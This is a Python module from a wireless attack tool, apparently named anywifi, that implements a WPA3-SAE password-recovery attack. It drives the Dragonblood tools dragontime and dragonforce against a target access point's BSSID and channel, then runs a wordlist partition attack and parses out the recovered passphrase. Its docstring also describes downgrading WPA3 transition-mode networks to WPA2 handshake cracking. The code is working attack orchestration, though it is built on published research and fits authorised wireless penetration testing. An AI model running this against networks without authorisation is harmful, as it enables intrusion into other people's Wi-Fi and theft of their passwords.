"""WPA3 handling.

Two realities are modelled:

* **WPA3-Transition (mixed) mode** — the only WPA3 attack that works in practice.
  Those APs broadcast WPA2 + WPA3 under one SSID; a WPA2 client associates with
  WPA2-PSK, so we capture a WPA2 PMKID/4-way handshake and crack it offline.
  This is handled by the normal PMKID/handshake vectors (they accept "WPA2/WPA3"),
  so no separate code is needed here — the CLI just labels it as a downgrade.

* **Pure WPA3-SAE** — SAE (Dragonfly) is a PAKE, so captured traffic can't be
  cracked offline, and PMF (802.11w) blocks deauth. The only offline-ish option is
  the **Dragonblood timing side-channel** (dragontime → dragonforce), which only
  works if the AP enables MODP group 22/23/24 and needs an Atheros card with the
  ath_masker module. It is therefore an opt-in, experimental vector: it runs only
  when the user explicitly asks (``--only wpa3``); otherwise the network is skipped
  with the reason. See github.com/vanhoefm/dragondrain-and-time.
"""

from __future__ import annotations

import os
import re

from anywifi.attacks.base import Attack
from anywifi.config import (
    DRAGONTIME_DURATION,
    DRAGONTIME_GROUP,
    DRAGONTIME_TIMEOUT_MS,
    DRAGONTIME_WAIT_MS,
)
from anywifi.crack import cracker
from anywifi.model import AttackContext, AttackResult, Network

_DRAGONBLOOD_URL = "github.com/vanhoefm/dragondrain-and-time"
_FOUND_RE = re.compile(r"(?:password|passphrase|found)[^\n:=]*[:=]\s*(\S+)", re.IGNORECASE)


def _parse_dragonforce(output: str):
    m = _FOUND_RE.search(output or "")
    return m.group(1) if m else None


class Wpa3Attack(Attack):
    vector = "wpa3"
    label = "WPA3-SAE (Dragonblood timing — experimental)"

    def applicable(self, net: Network) -> bool:
        # Only pure WPA3-SAE. Transition mode is handled by the WPA2 vectors.
        return net.is_wpa3

    def run(self, net: Network, ctx: AttackContext) -> AttackResult:
        runner = ctx.runner
        explicit = ctx.only is not None and self.vector in ctx.only
        have_time = runner.has("dragontime")

        why = ("SAE is a PAKE → no offline dictionary from captured traffic; "
               "PMF blocks deauth. The practical WPA3 attack is transition (mixed) "
               "mode, handled on the WPA2 side")

        # Default chain: don't run the rare, hardware-specific attack automatically.
        if not explicit:
            extra = ("run `--only wpa3` to attempt the experimental Dragonblood timing attack"
                     if have_time else f"install Dragonblood ({_DRAGONBLOOD_URL}) to attempt it")
            return self._result(net, success=False, skipped=True,
                                message=f"WPA3-SAE skipped — {why}; {extra}.")

        # Explicit opt-in.
        if not have_time and not ctx.dry_run:
            return self._result(net, success=False, skipped=True,
                message=f"WPA3-SAE: dragontime not found. Install Dragonblood "
                        f"({_DRAGONBLOOD_URL}); needs an Atheros card + ath_masker and "
                        f"only works if the AP uses MODP group 22/23/24.")
        return self._dragonblood(net, ctx)

    def _dragonblood(self, net: Network, ctx: AttackContext) -> AttackResult:
        runner = ctx.runner
        iface = ctx.interface
        base = os.path.join(str(ctx.output_dir), f"wpa3_{net.bssid.replace(':', '')}")
        measurements = base + "_measurements.txt"

        runner.run(["iw", "dev", iface, "set", "channel", str(net.channel)])
        # Timing side-channel measurement (experimental).
        runner.run_timed(
            ["dragontime", "-d", iface, "-c", str(net.channel), "-a", net.bssid,
             "-g", str(DRAGONTIME_GROUP), "-i", str(DRAGONTIME_WAIT_MS),
             "-t", str(DRAGONTIME_TIMEOUT_MS), "-o", measurements],
            duration=DRAGONTIME_DURATION, capture=True,
        )

        if not ctx.dry_run and (not os.path.exists(measurements)
                                or os.path.getsize(measurements) == 0):
            return self._result(net, success=False, skipped=True,
                message="WPA3-SAE: no timing leak — AP not vulnerable "
                        "(needs MODP group 22/23/24).")

        # Recover the password from the measurements with a dictionary (dragonforce).
        if not runner.has("dragonforce") and not ctx.dry_run:
            return self._result(net, success=False, capture_file=measurements,
                message=f"Timing measurements saved to {measurements}; run dragonforce "
                        f"with a wordlist to recover the password ({_DRAGONBLOOD_URL}).")

        wl = cracker.find_wordlist(override=ctx.wordlist, prompt=False)
        if not wl:
            return self._result(net, success=False, capture_file=measurements,
                message="WPA3-SAE: no wordlist found for the dragonforce partition attack.")

        res = runner.run(["dragonforce", measurements, wl], timeout=None, capture=True)
        pw = _parse_dragonforce((res.stdout or "") + (res.stderr or ""))
        if pw:
            return self._result(net, success=True, password=pw, capture_file=measurements,
                                message="WPA3 password recovered via Dragonblood")
        return self._result(net, success=False, capture_file=measurements,
                            message="Dragonblood partition attack did not recover the password.")
